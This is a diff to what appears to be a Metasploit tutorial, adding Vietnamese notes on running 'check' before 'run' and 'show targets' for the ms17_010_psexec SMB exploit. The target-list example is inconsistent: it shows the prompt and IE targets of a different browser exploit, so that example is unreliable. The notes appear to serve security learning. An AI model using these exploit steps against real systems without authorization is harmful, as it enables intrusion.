@@ -322,8 +322,29 @@ Once everything is set and ready to go, we can proceed to launch the attack. Not
 
   msf6 exploit(windows/smb/ms17_010_psexec) > run
 
-Tôi thường dùng msf6 check để kiểm tra trước đó 
-exploit(windows/smb/ms17_010_psexec) > check
+Tôi thường dùng msf6 >check để kiểm tra trước khi >run đó 
+  exploit(windows/smb/ms17_010_psexec) > check
+
+
+Dùng show target khi nào 
+  msf6 > use exploit/windows/smb/ms17_010_psexec
+  msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets
+  
+  Exploit targets: 
+     Id  Name
+     --  ----
+     0   Automatic
+     1   IE 7 on Windows XP SP3
+     2   IE 8 on Windows XP SP3
+     3   IE 7 on Windows Vista
+     4   IE 8 on Windows Vista
+     5   IE 8 on Windows 7
+     6   IE 9 on Windows 7
+
+show targets chèn ngay sau khi chọn exploit, để xác định OS nào sẽ khai thác.
+Tại sao phải chọn target trong khi msfconsole có khả năng tự động tìm được. Giảm khá năng crash, giảm thời gian, phạm vi sử dụng metasploit 
+
+
 
 
 
